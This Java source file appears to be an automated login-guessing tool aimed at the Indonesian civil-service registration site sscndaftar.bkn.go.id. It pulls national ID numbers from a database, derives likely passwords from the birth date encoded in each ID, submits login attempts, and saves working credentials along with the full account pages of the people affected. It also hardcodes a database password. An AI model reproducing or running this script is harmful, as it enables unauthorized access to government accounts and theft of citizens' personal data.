package com.fjr.sscn;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;



import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlInput;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
//import com.mysql.jdbc.PreparedStatement;

public class CheckLoginSSCN {
	PrintWriter out , outLog, outdata ;
	
	public CheckLoginSSCN(int idtable) throws Exception{
		HtmlPage page1 = null;
		WebClient webClient = new WebClient();
		webClient.getCookieManager().clearCookies();
		webClient.getOptions().setJavaScriptEnabled(false);
		webClient.getOptions().setCssEnabled(false);
		// Password login salah

		Class.forName("org.postgresql.Driver") ;
		Connection connection = DriverManager.getConnection("jdbc:postgresql://localhost:5433/olah_data", "postgres" , "09huiI" ); 
		
		try {
			 out = new PrintWriter(new FileOutputStream("D:/daftar_login.txt")); 
			 outLog = new PrintWriter(new FileOutputStream("D:/log.txt"));
			 outdata = new PrintWriter(new FileOutputStream("D:/data_peserta.txt"));

			page1 = webClient.getPage("https://sscndaftar.bkn.go.id/");
			PreparedStatement stmt = connection.prepareStatement("select id,  nama, nik , no_peserta from ktp_ganjil_2018 where keterangan = 1 and nik like '7%' and id >= "+idtable+" order by id asc"); 
			ResultSet  resultset = stmt.executeQuery(); 
A:			while(resultset.next()) {
				try {
					int id = resultset.getInt("id");  
					outLog.println(id);
					outLog.flush();
					String nik = resultset.getString("nik"); 
					String no_peserta = resultset.getString( "no_peserta" );
			B:		for(int ii = 1; ii<=3; ii++) {						
						String nik_try = nik.substring(0, 12).concat("000").concat(Integer.toString(ii)); 
						String tanggal_nik = convertNikWanita(nik , false); 
						
						HtmlForm form = (HtmlForm) page1.getElementById("FormLogin"); 
						HtmlInput name = form.getInputByName("nik"); 
						name.setValueAttribute(nik_try); 
						HtmlInput password = form.getInputByName("password"); 
						password.setValueAttribute(tanggal_nik); 
						HtmlButton button = (HtmlButton) page1.getElementById("btnSimpan"); 
						HtmlPage page2 = button.click();
						String result = page2.asText(); 
						if( ! result.contains("Password login salah") &&  ! result.contains("NIK Belum Terdaftar")) {
							out.println(nik_try + "|" + tanggal_nik + "|" + no_peserta) ;
							out.flush();
							outdata.println(page2.asXml()); 
							outdata.println("===============================================================================");
							outdata.flush();
							continue B; 
						}
						
						
						tanggal_nik = convertNikWanita(nik , true); 
						
						form = (HtmlForm) page1.getElementById("FormLogin"); 
						name = form.getInputByName("nik"); 
						name.setValueAttribute(nik_try); 
						password = form.getInputByName("password"); 
						password.setValueAttribute(tanggal_nik); 
						button = (HtmlButton) page1.getElementById("btnSimpan"); 
						page2 = button.click();
						result = page2.asText(); 
						if( ! result.contains("Password login salah") &&  ! result.contains("NIK Belum Terdaftar")) {
							out.println(nik_try + "|" + tanggal_nik + "|" + no_peserta) ;
							out.flush();
							outdata.println(page2.asXml()); 
							outdata.println("===============================================================================");
						}

					}
				}catch(Exception e) {
					e.printStackTrace();
					continue A;
				}
			}
			
		} catch (Exception e) {
			e.printStackTrace();
		}finally {
			if(out!= null ) {
				out.close();
			}
			if(outLog!= null ) {
				out.close();
			}
			if(outdata!= null) {
				outdata.close();
			}
		}
	
		
	}
	
	public String convertNikWanita(String nik , boolean includeYearPrefix) {
//		int a = Integer.parseInt(input.substring(0,2));  
//		if(a > 40) {
//			a = a - 40; 
//		}
//		return Integer.to; 
		
		String nik_ = nik.substring(6,12); 
		int tgl_ktp = Integer.valueOf(nik_.substring(0,2)); 
		if( tgl_ktp > 40) {
			tgl_ktp  = tgl_ktp - 40 ;
		}
		String tgl_ktp_str = Integer.toString(tgl_ktp);
		if(tgl_ktp_str.length() == 1) {
			tgl_ktp_str = "0".concat(tgl_ktp_str);
		}
		String bulan_ktp_str = nik_.substring(2,4); 
		String tahun_ktp_str = nik_.substring(4,6)  ;
		if( includeYearPrefix) {
			tahun_ktp_str = "19".concat( tahun_ktp_str ) ;
		}
		
		String tgl_final = tgl_ktp_str.concat( bulan_ktp_str ).concat( tahun_ktp_str );
		
		return tgl_final; 
	}
	
	public static void main(String[] args) {
		try {
			int m = 0 ; 
			try {
				if(args.length == 1) {
					m = Integer.parseInt(args[0]);
				}
			}catch(Exception e) {}
			new CheckLoginSSCN(m);
		}catch(Exception e) {
			e.printStackTrace();
		}
	}

}
